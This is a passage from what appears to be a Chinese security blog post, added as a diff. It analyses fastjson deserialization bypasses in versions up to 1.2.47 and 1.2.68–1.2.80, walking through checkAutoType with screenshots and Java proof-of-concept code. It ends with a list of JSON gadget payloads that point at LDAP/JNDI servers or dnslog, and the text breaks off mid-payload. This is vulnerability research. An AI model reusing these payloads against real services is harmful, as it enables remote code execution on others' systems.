+            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">JSONException</span><span class="token punctuation">(</span><span class="token string">"type not match. "</span> <span class="token operator">+</span> typeName <span class="token operator">+</span> <span class="token string">" -> "</span> <span class="token operator">+</span> expectClass<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+
+        <span class="token keyword">return</span> clazz<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>autoTypeSupport<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">long</span> hash <span class="token operator">=</span> h3<span class="token punctuation">;</span>
+        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> className<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token keyword">char</span> c <span class="token operator">=</span> className<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            hash <span class="token operator">^=</span> c<span class="token punctuation">;</span>
+            hash <span class="token operator">*=</span> <span class="token constant">PRIME</span><span class="token punctuation">;</span>
+
+            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">binarySearch</span><span class="token punctuation">(</span>denyHashCodes<span class="token punctuation">,</span> hash<span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">JSONException</span><span class="token punctuation">(</span><span class="token string">"autoType is not support. "</span> <span class="token operator">+</span> typeName<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">&#125;</span>
+
+            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">binarySearch</span><span class="token punctuation">(</span>acceptHashCodes<span class="token punctuation">,</span> hash<span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                <span class="token keyword">if</span> <span class="token punctuation">(</span>clazz <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                    clazz <span class="token operator">=</span> <span class="token class-name">TypeUtils</span><span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>typeName<span class="token punctuation">,</span> defaultClassLoader<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token punctuation">&#125;</span>
+
+                <span class="token keyword">if</span> <span class="token punctuation">(</span>expectClass <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> expectClass<span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">JSONException</span><span class="token punctuation">(</span><span class="token string">"type not match. "</span> <span class="token operator">+</span> typeName <span class="token operator">+</span> <span class="token string">" -> "</span> <span class="token operator">+</span> expectClass<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token punctuation">&#125;</span>
+
+                <span class="token keyword">return</span> clazz<span class="token punctuation">;</span>
+            <span class="token punctuation">&#125;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>clazz <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        clazz <span class="token operator">=</span> <span class="token class-name">TypeUtils</span><span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>typeName<span class="token punctuation">,</span> defaultClassLoader<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>clazz <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">TypeUtils</span><span class="token punctuation">.</span><span class="token function">getAnnotation</span><span class="token punctuation">(</span>clazz<span class="token punctuation">,</span><span class="token class-name">JSONType</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token keyword">return</span> clazz<span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">ClassLoader</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span> <span class="token comment">// classloader is danger</span>
+                <span class="token operator">||</span> <span class="token class-name">DataSource</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span> <span class="token comment">// dataSource can load jdbc driver</span>
+                <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">JSONException</span><span class="token punctuation">(</span><span class="token string">"autoType is not support. "</span> <span class="token operator">+</span> typeName<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>expectClass <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>expectClass<span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                <span class="token keyword">return</span> clazz<span class="token punctuation">;</span>
+            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">JSONException</span><span class="token punctuation">(</span><span class="token string">"type not match. "</span> <span class="token operator">+</span> typeName <span class="token operator">+</span> <span class="token string">" -> "</span> <span class="token operator">+</span> expectClass<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">&#125;</span>
+        <span class="token punctuation">&#125;</span>
+
+        <span class="token class-name">JavaBeanInfo</span> beanInfo <span class="token operator">=</span> <span class="token class-name">JavaBeanInfo</span><span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span>clazz<span class="token punctuation">,</span> clazz<span class="token punctuation">,</span> propertyNamingStrategy<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>beanInfo<span class="token punctuation">.</span>creatorConstructor <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> autoTypeSupport<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">JSONException</span><span class="token punctuation">(</span><span class="token string">"autoType is not support. "</span> <span class="token operator">+</span> typeName<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">final</span> <span class="token keyword">int</span> mask <span class="token operator">=</span> <span class="token class-name">Feature<span class="token punctuation">.</span>SupportAutoType</span><span class="token punctuation">.</span>mask<span class="token punctuation">;</span>
+    <span class="token keyword">boolean</span> autoTypeSupport <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>autoTypeSupport
+            <span class="token operator">||</span> <span class="token punctuation">(</span>features <span class="token operator">&amp;</span> mask<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span>
+            <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token constant">DEFAULT_PARSER_FEATURE</span> <span class="token operator">&amp;</span> mask<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>autoTypeSupport<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">JSONException</span><span class="token punctuation">(</span><span class="token string">"autoType is not support. "</span> <span class="token operator">+</span> typeName<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">return</span> clazz<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/images/image-20230806135043506.png" alt="image-20230806135043506"></p>
+<p>问题出在这里，如果我们没有开启 <code>autoTypeSupport</code> 也没有期望类 <code>expectClass</code>，那么就会从 <code>TypeUtils.mappings</code> 中查找</p>
+<p><img src="/images/image-20230806135641544.png" alt="image-20230806135641544"></p>
+<p>我们查找下是哪个地方可以调用 <code>mappings.put()</code> 方法，在 <code>TypeUtils</code> 类 <code>loadClass</code> 方法调用了</p>
+<p><img src="/images/image-20230807102902664.png" alt="image-20230807102902664"></p>
+<p>在 <code>MiscCodec</code> 类中的 <code>deserialze</code> 反序列化方法中调用了 <code>TypeUtils.loadClass</code> 方法</p>
+<p><img src="/images/image-20230807103448992.png" alt="image-20230807103448992"></p>
+<p><code>checkAutoType</code> 方法中如果在 <code>mappings</code> 中查找不到我们传入的类，那么就会从类型为 <code>IdentityHashMap</code> 类型的反序列化器中查找，这里我们传入类名 <code>java.lang.Class</code> 的原因是这个类名在反序列化器中的反序列化器是 <code>MiscCodec</code></p>
+<p><img src="/images/image-20230807104011090.png" alt="image-20230807104011090"></p>
+<p>通过了 <code>checkAutoType</code> 的校验，再到后面就获取了反序列化器的类，那么只要后面调用了这个反序列化器的反序列化方法，就会调用前面的 <code>TypeUtils.loadClass</code> 类加载方法，那么我们跟进看下这个反序列化方法做了什么</p>
+<p><img src="/images/image-20230807104601374.png" alt="image-20230807104601374"></p>
+<p>在 <code>MiscCodec</code> 类的 <code>deserialze</code> 方法中就是获取了下一个键值对，而且下一个键值对键必须是 <code>val</code> 字符才可以，否则就抛出异常了</p>
+<p><img src="/images/image-20230807104927532.png" alt="image-20230807104927532"></p>
+<p>然后就是获取了键值对的值了，这里是我们想要加载类的类名</p>
+<p><img src="/images/image-20230807105118340.png" alt="image-20230807105118340"></p>
+<p><img src="/images/image-20230807105145113.png" alt="image-20230807105145113"></p>
+<p><img src="/images/image-20230807105211879.png" alt="image-20230807105211879"></p>
+<p><img src="/images/image-20230807105253819.png" alt="image-20230807105253819"></p>
+<p>这里使用了AppClassLoader将需要利用的类进行加载，并且把需要利用的类名和加载好的类放进了 <code>mappings</code>，当我们给的JSON字符串有两个键值对，第一个按照上面的方法，把我们需要利用的类给放进 <code>mappings</code>，后面的键值对正常利用即可，按照这个思路，我们写出POC</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span><span class="token class-name">JSON</span></span><span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> main <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token class-name">String</span> jsonstr <span class="token operator">=</span> <span class="token string">"&#123;\"a\":&#123;\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset"</span> <span class="token operator">+</span>
+                <span class="token string">".JdbcRowSetImpl\"&#125;,\"b\":&#123;\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0"</span> <span class="token operator">+</span>
+                <span class="token string">".1:8085/cOzANMth\",\"autoCommit\":false&#125;&#125;"</span><span class="token punctuation">;</span>
+        <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>jsonstr<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>JSON字符串的 <code>a</code> 键值对负责将我们需要利用的类放入 <code>mappings</code>，而 <code>b</code> 键值对就是直接利用该类进行攻击即可</p>
+<p><img src="/images/image-20230807110526156.png" alt="image-20230807110526156"></p>
+<p>当进行下一个键值对的解析时进入 <code>checkAutoType</code> 方法，传入需要利用的类名</p>
+<p><img src="/images/image-20230807110741540.png" alt="image-20230807110741540"></p>
+<p>走到下面，从 <code>mappings</code> 获取我们传入的类名就可以找到了，然后返回了这个类</p>
+<p><img src="/images/image-20230807111916601.png" alt="image-20230807111916601"></p>
+<p><img src="/images/image-20230807111948388.png" alt="image-20230807111948388"></p>
+<h2 id="fastjson-lt-x3D-1-2-80绕过分析"><a href="#fastjson-lt-x3D-1-2-80绕过分析" class="headerlink" title="fastjson&lt;&#x3D;1.2.80绕过分析"></a>fastjson&lt;&#x3D;1.2.80绕过分析</h2><p>在fastjson1.2.48版本修复了1.2.47版本的绕过，在fastjson1.2.68开始更新了一个 <code>safeMode</code> 控制，如果开启了 <code>safeMode</code> 在调用 <code>checkAutoTyep</code> 方法时就会抛出异常</p>
+<p>具体影响版本：1.2.68 &lt;&#x3D; fastjson &lt;&#x3D; 1.2.80</p>
+<h3 id="修复方案分析-4"><a href="#修复方案分析-4" class="headerlink" title="修复方案分析"></a>修复方案分析</h3><p><img src="/images/image-20230807153748378.png" alt="image-20230807153748378"></p>
+<p><img src="/images/image-20230807152937258.png" alt="image-20230807152937258"></p>
+<p><code>MiscCodec</code> 类中调用 <code>TypeUtils.loadClass</code> 默认cache缓存为false，这样就避免了在fastjson1.2.47版本的绕过</p>
+<h3 id="绕过分析-5"><a href="#绕过分析-5" class="headerlink" title="绕过分析"></a>绕过分析</h3><p><img src="/images/image-20230808092000389.png" alt="image-20230808092000389"></p>
+<p><img src="/images/image-20230808091729818.png" alt="image-20230808091729818"></p>
+<p><img src="/images/image-20230808091929051.png" alt="image-20230808091929051"></p>
+<p>在 <code>checkAutoType</code> 方法中，如果开启了 <code>safeMode</code> 这里就直接抛出异常了</p>
+<p>如果 <code>expectClass</code> 期望类有入参，且传入的类名是 <code>expectClass</code> 的子类或实现类，那么就可以通过 <code>checkAutoType</code> 的检查</p>
+<p><img src="/images/image-20230808093422645.png" alt="image-20230808093422645"></p>
+<p>经过查找，发现只有 <code>JavaBeanDeserializer#deserialze</code> 和 <code>ThrowableDeserializer#deserialze</code> 方法中 <code>expectClass</code> 是可控的</p>
+<p>写出POC如下：</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span><span class="token class-name">JSON</span></span><span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> main <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token class-name">String</span> jsonstr <span class="token operator">=</span> <span class="token string">"&#123;\"@type\":\"java.lang.Exception\",\"@type\":\"FastjsonResearch.EvilClass\"&#125;"</span><span class="token punctuation">;</span>
+        <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>jsonstr<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/images/image-20230809100538474.png" alt="image-20230809100538474"></p>
+<p><code>java.lang.Exception</code> 是期望类，由于在 <code>mappings</code> 缓存中是存在 <code>java.lang.Exception</code> 类的，可以获取到这个类且是期望类，这里返回了这个类</p>
+<p><img src="/images/image-20230809100709490.png" alt="image-20230809100709490"></p>
+<p>这里就是调用了 <code>java.lang.Exception</code> 的反序列化器 <code>ThrowableDeserializer</code> 的 <code>deserialze</code> 方法，<code>deserClass</code> 则是 <code>Throwable.class</code></p>
+<p><img src="/images/image-20230809104230864.png" alt="image-20230809104230864"></p>
+<p><img src="/images/image-20230809105628553.png" alt="image-20230809105628553"></p>
+<p><img src="/images/image-20230809105730718.png" alt="image-20230809105730718"></p>
+<p>这里加载了我们的恶意类，并添加到了 <code>TypeUtils.mappings</code> 中</p>
+<p><img src="/images/image-20230809110848893.png" alt="image-20230809110848893"></p>
+<p><code>exClass</code> 就是我们的恶意类，调用了 <code>createException</code> 方法，跟进这个方法看一下做了什么</p>
+<p><img src="/images/image-20230809111010275.png" alt="image-20230809111010275"></p>
+<p><img src="/images/image-20230809111054040.png" alt="image-20230809111054040"></p>
+<p>这里默认构造器就是恶意类的构造器，通过这个构造器实例化了恶意类即执行了恶意命令</p>
+<p><img src="/images/image-20230809111222072.png" alt="image-20230809111222072"></p>
+<p>最后，执行了恶意类的代码。需要注意的是，这里我们在本地进行测试时，写了一个本地的恶意类进行加载，目前没有一个完整的利用链</p>
+<h2 id="反序列化链Payload"><a href="#反序列化链Payload" class="headerlink" title="反序列化链Payload"></a>反序列化链Payload</h2><h3 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h3><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
+    <span class="token property">"@type"</span><span class="token operator">:</span> <span class="token string">"com.sun.rowset.JdbcRowSetImpl"</span><span class="token punctuation">,</span>
+    <span class="token property">"dataSourceName"</span><span class="token operator">:</span> <span class="token string">"ldap://127.0.0.1:23457/Command8"</span><span class="token punctuation">,</span>
+    <span class="token property">"autoCommit"</span><span class="token operator">:</span> <span class="token boolean">true</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h3><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
+	<span class="token property">"@type"</span><span class="token operator">:</span> <span class="token string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span><span class="token punctuation">,</span>
+	<span class="token property">"_bytecodes"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"yv66vgA...k="</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
+	'_name'<span class="token operator">:</span> 'su18'<span class="token punctuation">,</span>
+	'_tfactory'<span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+	<span class="token property">"_outputProperties"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="JndiDataSourceFactory"><a href="#JndiDataSourceFactory" class="headerlink" title="JndiDataSourceFactory"></a>JndiDataSourceFactory</h3><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
+    <span class="token property">"@type"</span><span class="token operator">:</span> <span class="token string">"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory"</span><span class="token punctuation">,</span>
+    <span class="token property">"properties"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
+      <span class="token property">"data_source"</span><span class="token operator">:</span> <span class="token string">"ldap://127.0.0.1:23457/Command8"</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="SimpleJndiBeanFactory"><a href="#SimpleJndiBeanFactory" class="headerlink" title="SimpleJndiBeanFactory"></a>SimpleJndiBeanFactory</h3><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
+    <span class="token property">"@type"</span><span class="token operator">:</span> <span class="token string">"org.springframework.beans.factory.config.PropertyPathFactoryBean"</span><span class="token punctuation">,</span>
+    <span class="token property">"targetBeanName"</span><span class="token operator">:</span> <span class="token string">"ldap://127.0.0.1:23457/Command8"</span><span class="token punctuation">,</span>
+    <span class="token property">"propertyPath"</span><span class="token operator">:</span> <span class="token string">"su18"</span><span class="token punctuation">,</span>
+    <span class="token property">"beanFactory"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
+      <span class="token property">"@type"</span><span class="token operator">:</span> <span class="token string">"org.springframework.jndi.support.SimpleJndiBeanFactory"</span><span class="token punctuation">,</span>
+      <span class="token property">"shareableResources"</span><span class="token operator">:</span> <span class="token punctuation">[</span>
+        <span class="token string">"ldap://127.0.0.1:23457/Command8"</span>
+      <span class="token punctuation">]</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="DefaultBeanFactoryPointcutAdvisor"><a href="#DefaultBeanFactoryPointcutAdvisor" class="headerlink" title="DefaultBeanFactoryPointcutAdvisor"></a>DefaultBeanFactoryPointcutAdvisor</h3><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
+  <span class="token property">"@type"</span><span class="token operator">:</span> <span class="token string">"org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor"</span><span class="token punctuation">,</span>
+   <span class="token property">"beanFactory"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
+     <span class="token property">"@type"</span><span class="token operator">:</span> <span class="token string">"org.springframework.jndi.support.SimpleJndiBeanFactory"</span><span class="token punctuation">,</span>
+     <span class="token property">"shareableResources"</span><span class="token operator">:</span> <span class="token punctuation">[</span>
+       <span class="token string">"ldap://127.0.0.1:23457/Command8"</span>
+     <span class="token punctuation">]</span>
+   <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+   <span class="token property">"adviceBeanName"</span><span class="token operator">:</span> <span class="token string">"ldap://127.0.0.1:23457/Command8"</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+<span class="token punctuation">&#123;</span>
+   <span class="token property">"@type"</span><span class="token operator">:</span> <span class="token string">"org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor"</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="WrapperConnectionPoolDataSource"><a href="#WrapperConnectionPoolDataSource" class="headerlink" title="WrapperConnectionPoolDataSource"></a>WrapperConnectionPoolDataSource</h3><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
+    <span class="token property">"@type"</span><span class="token operator">:</span> <span class="token string">"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource"</span><span class="token punctuation">,</span>
+    <span class="token property">"userOverridesAsString"</span><span class="token operator">:</span> <span class="token string">"HexAsciiSerializedMap:aced000...6f;"</span>
+  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="JndiRefForwardingDataSource"><a href="#JndiRefForwardingDataSource" class="headerlink" title="JndiRefForwardingDataSource"></a>JndiRefForwardingDataSource</h3><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
+    <span class="token property">"@type"</span><span class="token operator">:</span> <span class="token string">"com.mchange.v2.c3p0.JndiRefForwardingDataSource"</span><span class="token punctuation">,</span>
+    <span class="token property">"jndiName"</span><span class="token operator">:</span> <span class="token string">"ldap://127.0.0.1:23457/Command8"</span><span class="token punctuation">,</span>
+    <span class="token property">"loginTimeout"</span><span class="token operator">:</span> <span class="token number">0</span>
+  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="InetAddress"><a href="#InetAddress" class="headerlink" title="InetAddress"></a>InetAddress</h3><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
+	<span class="token property">"@type"</span><span class="token operator">:</span> <span class="token string">"java.net.InetAddress"</span><span class="token punctuation">,</span>
+	<span class="token property">"val"</span><span class="token operator">:</span> <span class="token string">"http://dnslog.com"</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="Inet6Address"><a href="#Inet6Address" class="headerlink" title="Inet6Address"></a>Inet6Address</h3><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
+	<span class="token property">"@type"</span><span class="token operator">:</span> <span class="token string">"java.net.Inet6Address"</span><span class="token punctuation">,</span>
+	<span class="token property">"val"</span><span class="token operator">:</span> <span class="token string">"http://dnslog.com"</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h3><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
+	<span class="token property">"@type"</span><span class="token operator">:</span> <span class="token string">"java.net.URL"</span><span class="token punctuation">,</span>
+	<span class="token property">"val"</span><span class="token operator">:</span> <span class="token string">"http://dnslog.com"</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="JSONObject"><a href="#JSONObject" class="headerlink" title="JSONObject"></a>JSONObject</h3><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
+	<span class="token property">"@type"</span><span class="token operator">:</span> <span class="token string">"com.alibaba.fastjson.JSONObject"</span><span class="token punctuation">,</span>
+	<span class="token punctuation">&#123;</span>
+		<span class="token property">"@type"</span><span class="token operator">:</span> <span class="token string">"java.net.URL"</span><span class="token punctuation">,</span>
+		<span class="token property">"val"</span><span class="token operator">:</span> <span class="token string">"http://dnslog.com"</span>
+	<span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token string">""</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="URLReader"><a href="#URLReader" class="headerlink" title="URLReader"></a>URLReader</h3><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
+	<span class="token property">"poc"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
+		<span class="token property">"@type"</span><span class="token operator">:</span> <span class="token string">"java.lang.AutoCloseable"</span><span class="token punctuation">,</span>
